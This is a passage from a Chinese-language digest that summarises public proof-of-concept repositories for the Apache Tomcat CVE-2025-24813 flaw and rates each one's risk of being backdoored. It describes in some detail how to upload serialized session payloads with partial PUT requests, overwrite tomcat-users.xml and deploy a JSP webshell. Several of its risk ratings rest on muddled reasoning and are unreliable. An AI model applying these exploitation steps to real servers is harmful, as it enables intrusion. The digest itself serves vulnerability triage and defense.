提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

